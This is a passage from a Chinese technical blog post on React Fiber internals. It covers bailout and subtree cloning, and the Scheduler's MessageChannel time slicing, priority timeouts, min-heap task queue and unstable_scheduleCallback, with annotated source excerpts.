class="hljs-keyword">function</span> <span class="hljs-title function_">bailoutOnAlreadyFinishedWork</span>(<span class="hljs-params">current: Fiber, workInProgress: Fiber, renderLanes: Lanes</span>): <span class="hljs-title class_">Fiber</span> | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-title function_">cloneChildFibers</span>(current, workInProgress); <span class="hljs-comment">// 克隆子树</span><br>  <span class="hljs-keyword">return</span> workInProgress.<span class="hljs-property">child</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键操作：</p><ul><li>子树克隆：直接拷贝 current 树的子链表到 workInProgress 树。</li><li>副作用继承：保留旧 Fiber 的 subtreeFlags（标记子树是否需要更新）。</li></ul><p><strong>性能优化对比</strong></p><table><thead><tr><th align="left">场景</th><th align="left">传统 Diff</th><th align="left">Fiber Diff</th></tr></thead><tbody><tr><td align="left">节点复用</td><td align="left">仅复用 DOM</td><td align="left">状态+DOM+hooks</td></tr><tr><td align="left">条件判断</td><td align="left">无系统化 bailout</td><td align="left">多维度检测（props&#x2F;context&#x2F;优先级）</td></tr><tr><td align="left">子树跳过</td><td align="left">不可能</td><td align="left">直接克隆整棵子树（O(1) 操作）</td></tr><tr><td align="left">时间复杂度</td><td align="left">O(n²)（递归）</td><td align="left">O(n)（map查找+链表遍历）</td></tr></tbody></table><h1 id="第四章：Fiber的调度系统与并发模式"><a href="#第四章：Fiber的调度系统与并发模式" class="headerlink" title="第四章：Fiber的调度系统与并发模式"></a>第四章：Fiber的调度系统与并发模式</h1><h2 id="4-1-调度器（Scheduler）的实现原理"><a href="#4-1-调度器（Scheduler）的实现原理" class="headerlink" title="4.1 调度器（Scheduler）的实现原理"></a>4.1 调度器（Scheduler）的实现原理</h2><p>调度器（scheduler）是 Fiber 架构中并发模式的核心实现。调度器的核心目标有三点：</p><ul><li>任务可中断与恢复</li><li>优先级调度</li><li>时间切片</li></ul><p>React17 及之前版本中任务中断与时间切片的核心逻辑在于浏览器 requestIdleCallback API 的利用，但该 API 有几个问题：</p><ul><li>不可靠的执行时机：requestIdleCallback 的执行依赖于浏览器的空闲时间，但不同浏览器的实现差异较大，且可能被扩展插件、防病毒软件等干扰</li><li>无法保证任务顺序：requestIdleCallback 的回调执行顺序可能被打乱（尤其是设置了 timeout 时），而 React 需要精确控制任务优先级</li><li>兼容性问题：部分浏览器（如旧版 Safari）不支持 requestIdleCallback，或实现不一致</li><li>时间切片需求：React 需要将任务拆分为 5ms 左右的小块，而 requestIdleCallback 无法提供这种精细控制</li></ul><p>React 18 改用 <code>MessageChannel</code> 模拟 requestIdleCallback 的行为，并在此基础上实现更高级的调度策略</p><h3 id="MessageChannel与时间切片"><a href="#MessageChannel与时间切片" class="headerlink" title="MessageChannel与时间切片"></a>MessageChannel与时间切片</h3><p>MessageChannel 是浏览器提供的用于跨文档通信（跨窗口&#x2F;iframe）的 API，也被广泛用于主线程的任务调度</p><p><strong>基本用法</strong></p><p>MessageChannel 创建一个双向通信通道，包含两个MessagePort：</p><ul><li>port1：发送消息</li><li>port2：接收消息</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageChannel</span>();<br><span class="hljs-keyword">const</span> &#123; port1, port2 &#125; = channel;<br><br><span class="hljs-comment">// port2 监听消息</span><br>port2.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Received:&quot;</span>, event.<span class="hljs-property">data</span>);<br>&#125;;<br><br><span class="hljs-comment">// port1 发送消息</span><br>port1.<span class="hljs-title function_">postMessage</span>(<span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>特点</strong></p><ul><li>异步执行：postMessage 是宏任务，类似于 setTimeout(fn, 0)，但比setTimeout更高效</li><li>零延迟：浏览器会尽快执行回调，不受事件循环延迟影响</li><li>跨线程通信：可用于 Web Worker、Service Worker 等场景（但 React 调度器仅用于主线程）</li></ul><p><strong>React scheduler 如何使用 MessageChannel</strong></p><p>关键代码（Scheduler.js）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">performWorkUntilDeadline</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">if</span> (enableRequestPaint) &#123;<br>    needsPaint = <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (isMessageLoopRunning) &#123;<br>    <span class="hljs-keyword">const</span> currentTime = <span class="hljs-title function_">getCurrentTime</span>();<br>    <span class="hljs-comment">// Keep track of the start time so we can measure how long the main thread</span><br>    <span class="hljs-comment">// has been blocked.</span><br>    startTime = currentTime;<br><br>    <span class="hljs-comment">// If a scheduler task throws, exit the current browser task so the</span><br>    <span class="hljs-comment">// error can be observed.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Intentionally not using a try-catch, since that makes some debugging</span><br>    <span class="hljs-comment">// techniques harder. Instead, if `flushWork` errors, then `hasMoreWork` will</span><br>    <span class="hljs-comment">// remain true, and we&#x27;ll continue the work loop.</span><br>    <span class="hljs-keyword">let</span> hasMoreWork = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// workLoop 循环执行任务直到时间片用尽</span><br>      hasMoreWork = <span class="hljs-title function_">flushWork</span>(currentTime);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>      <span class="hljs-keyword">if</span> (hasMoreWork) &#123;<br>        <span class="hljs-comment">// If there&#x27;s more work, schedule the next message event at the end</span><br>        <span class="hljs-comment">// of the preceding one.</span><br>        <span class="hljs-title function_">schedulePerformWorkUntilDeadline</span>();<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        isMessageLoopRunning = <span class="hljs-literal">false</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">flushWork</span>(<span class="hljs-params">initialTime: number</span>) &#123;<br>  <span class="hljs-comment">// 省略非关键代码</span><br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">if</span> (enableProfiling) &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">workLoop</span>(initialTime);<br>      &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        <span class="hljs-comment">// 省略非关键代码</span><br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// No catch in prod code path.</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">workLoop</span>(initialTime);<br>    &#125;<br>  &#125; <span class="hljs-keyword">finally</span> &#123;<br>    <span class="hljs-comment">// 省略非关键代码</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">initialTime: number</span>) &#123;<br>  <span class="hljs-keyword">let</span> currentTime = initialTime;<br>  <span class="hljs-title function_">advanceTimers</span>(currentTime);<br>  currentTask = <span class="hljs-title function_">peek</span>(taskQueue);<br>  <span class="hljs-keyword">while</span> (currentTask !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!enableAlwaysYieldScheduler) &#123;<br>      <span class="hljs-keyword">if</span> (currentTask.<span class="hljs-property">expirationTime</span> &gt; currentTime &amp;&amp; <span class="hljs-title function_">shouldYieldToHost</span>()) &#123;<br>        <span class="hljs-comment">// This currentTask hasn&#x27;t expired, and we&#x27;ve reached the deadline.</span><br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">const</span> callback = currentTask.<span class="hljs-property">callback</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>      <span class="hljs-comment">// 省略</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-title function_">pop</span>(taskQueue)<br>    &#125;<br>    <span class="hljs-comment">// 省略任务队列循环处理逻辑代码</span><br>    currentTask = <span class="hljs-title function_">peek</span>(taskQueue);<br>  &#125;<br>  <span class="hljs-comment">// Return whether there&#x27;s additional work</span><br>  <span class="hljs-keyword">if</span> (currentTask !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">const</span> firstTimer = <span class="hljs-title function_">peek</span>(timerQueue);<br>    <span class="hljs-keyword">if</span> (firstTimer !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, firstTimer.<span class="hljs-property">startTime</span> - currentTime);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleTimeout</span>(<span class="hljs-params">currentTime: number</span>) &#123;<br>  isHostTimeoutScheduled = <span class="hljs-literal">false</span>;<br>  <span class="hljs-title function_">advanceTimers</span>(currentTime);<br><br>  <span class="hljs-keyword">if</span> (!isHostCallbackScheduled) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">peek</span>(taskQueue) !== <span class="hljs-literal">null</span>) &#123;<br>      isHostCallbackScheduled = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">requestHostCallback</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">const</span> firstTimer = <span class="hljs-title function_">peek</span>(timerQueue);<br>      <span class="hljs-keyword">if</span> (firstTimer !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, firstTimer.<span class="hljs-property">startTime</span> - currentTime);<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requestHostCallback</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (!isMessageLoopRunning) &#123;<br>    isMessageLoopRunning = <span class="hljs-literal">true</span>;<br>    <span class="hljs-title function_">schedulePerformWorkUntilDeadline</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// DOM and Worker environments.</span><br><span class="hljs-comment">// We prefer MessageChannel because of the 4ms setTimeout clamping.</span><br><span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageChannel</span>();<br><span class="hljs-keyword">const</span> port = channel.<span class="hljs-property">port2</span>;<br>channel.<span class="hljs-property">port1</span>.<span class="hljs-property">onmessage</span> = performWorkUntilDeadline; <span class="hljs-comment">// 接收消息后执行任务</span><br>schedulePerformWorkUntilDeadline = <span class="hljs-function">() =&gt;</span> &#123;<br>  port.<span class="hljs-title function_">postMessage</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 触发异步执行</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>调度流程如下：</p><ol><li>任务入队：unstable_scheduleCallback 将任务加入最小堆</li><li>触发调度：requestHostCallback 通过 port.postMessage(null) 请求调度</li><li>执行任务：浏览器在下一事件循环中调用 port1.onmessage，执行 flushWork</li><li>时间切片：flushWork 每次执行最多 5ms，超时则暂停（shouldYieldToHost）</li></ol><h3 id="优先级标记（Lane模型）与任务队列"><a href="#优先级标记（Lane模型）与任务队列" class="headerlink" title="优先级标记（Lane模型）与任务队列"></a>优先级标记（Lane模型）与任务队列</h3><p>之前章节我们已经学习过优先级载体 Lane 模型的概念，其对应代码定义如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// SchedulerPriorities.js</span><br><br><span class="hljs-keyword">export</span> type <span class="hljs-title class_">PriorityLevel</span> = <span class="hljs-number">0</span> | <span class="hljs-number">1</span> | <span class="hljs-number">2</span> | <span class="hljs-number">3</span> | <span class="hljs-number">4</span> | <span class="hljs-number">5</span>;<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Use symbols?</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">NoPriority</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">ImmediatePriority</span> = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserBlockingPriority</span> = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">NormalPriority</span> = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">LowPriority</span> = <span class="hljs-number">4</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">IdlePriority</span> = <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p><strong>优先级与超时时间映射</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> timeout;<br><span class="hljs-keyword">switch</span> (priorityLevel) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">ImmediatePriority</span>:<br>  <span class="hljs-comment">// Times out immediately</span><br>  timeout = -<span class="hljs-number">1</span>; <span class="hljs-comment">// 同步执行</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">UserBlockingPriority</span>:<br>  <span class="hljs-comment">// Eventually times out</span><br>  timeout = userBlockingPriorityTimeout; <span class="hljs-comment">// 250ms 超时</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">IdlePriority</span>:<br>  <span class="hljs-comment">// Never times out</span><br>  timeout = maxSigned31BitInt; <span class="hljs-comment">// 最大超时，var maxSigned31BitInt = 1073741823; 约12天</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">LowPriority</span>:<br>  <span class="hljs-comment">// Eventually times out</span><br>  timeout = lowPriorityTimeout; <span class="hljs-comment">// 10s 超时</span><br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-title class_">NormalPriority</span>:<br><span class="hljs-attr">default</span>:<br>  <span class="hljs-comment">// Eventually times out</span><br>  timeout = normalPriorityTimeout; <span class="hljs-comment">// 5s 超时</span><br>  <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>任务队列（最小堆）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// SchedulerMinHeap.js</span><br>type <span class="hljs-title class_">Heap</span>&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt; = <span class="hljs-title class_">Array</span>&lt;T&gt;;<br>type <span class="hljs-title class_">Node</span> = &#123;<br>  <span class="hljs-attr">id</span>: number,<br>  <span class="hljs-attr">sortIndex</span>: number,<br>  ...<br>&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> push&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt;(<span class="hljs-attr">heap</span>: <span class="hljs-title class_">Heap</span>&lt;T&gt;, <span class="hljs-attr">node</span>: T): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-keyword">const</span> index = heap.<span class="hljs-property">length</span>;<br>  heap.<span class="hljs-title function_">push</span>(node);<br>  <span class="hljs-title function_">siftUp</span>(heap, node, index);<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> peek&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt;(<span class="hljs-attr">heap</span>: <span class="hljs-title class_">Heap</span>&lt;T&gt;): T | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-keyword">return</span> heap.<span class="hljs-property">length</span> === <span class="hljs-number">0</span> ? <span class="hljs-literal">null</span> : heap[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> pop&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">Node</span>&gt;(<span class="hljs-attr">heap</span>: <span class="hljs-title class_">Heap</span>&lt;T&gt;): T | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-keyword">if</span> (heap.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-keyword">const</span> first = heap[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">const</span> last = heap.<span class="hljs-title function_">pop</span>();<br>  <span class="hljs-keyword">if</span> (last !== first) &#123;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-type]</span><br>    heap[<span class="hljs-number">0</span>] = last;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-call]</span><br>    <span class="hljs-title function_">siftDown</span>(heap, last, <span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> first;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>任务调度入口：unstable_scheduleCallback</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">unstable_scheduleCallback</span>(<span class="hljs-params"></span><br><span class="hljs-params">  priorityLevel: PriorityLevel,</span><br><span class="hljs-params">  callback: Callback,</span><br><span class="hljs-params">  options?: &#123;delay: number&#125;,</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Task</span> &#123;<br>  <span class="hljs-keyword">var</span> currentTime = <span class="hljs-title function_">getCurrentTime</span>();<br><br>  <span class="hljs-keyword">var</span> startTime;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; options !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">var</span> delay = options.<span class="hljs-property">delay</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> delay === <span class="hljs-string">&#x27;number&#x27;</span> &amp;&amp; delay &gt; <span class="hljs-number">0</span>) &#123;<br>      startTime = currentTime + delay;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      startTime = currentTime;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    startTime = currentTime;<br>  &#125;<br><br>  <span class="hljs-keyword">var</span> timeout;<br>  <span class="hljs-keyword">switch</span> (priorityLevel) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ImmediatePriority</span>:<br>      <span class="hljs-comment">// Times out immediately</span><br>      timeout = -<span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">UserBlockingPriority</span>:<br>      <span class="hljs-comment">// Eventually times out</span><br>      timeout = userBlockingPriorityTimeout;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">IdlePriority</span>:<br>      <span class="hljs-comment">// Never times out</span><br>      timeout = maxSigned31BitInt;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">LowPriority</span>:<br>      <span class="hljs-comment">// Eventually times out</span><br>      timeout = lowPriorityTimeout;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">NormalPriority</span>:<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-comment">// Eventually times out</span><br>      timeout = normalPriorityTimeout;<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 计算任务过期时间</span><br>  <span class="hljs-keyword">var</span> expirationTime = startTime + timeout;<br><br>  <span class="hljs-comment">// 创建新任务对象</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-attr">newTask</span>: <span class="hljs-title class_">Task</span> = &#123;<br>    <span class="hljs-attr">id</span>: taskIdCounter++,<br>    callback,<br>    priorityLevel,<br>    startTime,<br>    expirationTime,<br>    <span class="hljs-attr">sortIndex</span>: -<span class="hljs-number">1</span>,<br>  &#125;;<br>  <span class="hljs-keyword">if</span> (enableProfiling) &#123;<br>    newTask.<span class="hljs-property">isQueued</span> = <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (startTime &gt; currentTime) &#123;<br>    <span class="hljs-comment">// This is a delayed task.</span><br>    newTask.<span class="hljs-property">sortIndex</span> = startTime;<br>    <span class="hljs-comment">// 将任务插入最小堆（按expirationTime排序）</span><br>    <span class="hljs-title function_">push</span>(timerQueue, newTask);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">peek</span>(taskQueue) === <span class="hljs-literal">null</span> &amp;&amp; newTask === <span class="hljs-title function_">peek</span>(timerQueue)) &#123;<br>      <span class="hljs-comment">// All tasks are delayed, and this is the task with the earliest delay.</span><br>      <span class="hljs-keyword">if</span> (isHostTimeoutScheduled) &#123;<br>        <span class="hljs-comment">// Cancel an existing timeout.</span><br>        <span class="hljs-title function_">cancelHostTimeout</span>();<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        isHostTimeoutScheduled = <span class="hljs-literal">true</span>;<br>      &#125;<br>      <span class="hljs-comment">// Schedule a timeout.</span><br>      <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, startTime - currentTime);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    newTask.<span class="hljs-property">sortIndex</span> = expirationTime;<br>    <span class="hljs-title function_">push</span>(taskQueue, newTask);<br>    <span class="hljs-keyword">if</span> (enableProfiling) &#123;<br>      <span class="hljs-title function_">markTaskStart</span>(newTask, currentTime);<br>      newTask.<span class="hljs-property">isQueued</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-comment">// Schedule a host callback, if needed. If we&#x27;re already performing work,</span><br>    <span class="hljs-comment">// wait until the next time we yield.</span><br>    <span class="hljs-keyword">if</span> (!isHostCallbackScheduled &amp;&amp; !isPerformingWork) &#123;<br>      isHostCallbackScheduled = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">requestHostCallback</span>();<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> newTask;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>unstable_scheduleCallback被调用路径</strong></p><p>unstable_scheduleCallback 主要通过以下路径被调用：</p><ol><li>状态更新：setState、useState、useReducer。</li><li>副作用调度：useEffect、useLayoutEffect。</li><li>并发模式 API：startTransition、useDeferredValue。</li><li>根节点渲染：ReactDOM.createRoot().render()。</li></ol><p><strong>核心调用链路</strong></p><p>以 setState 为例，调用链如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">setState -&gt; enqueueSetState -&gt; scheduleUpdateOnFiber -&gt; 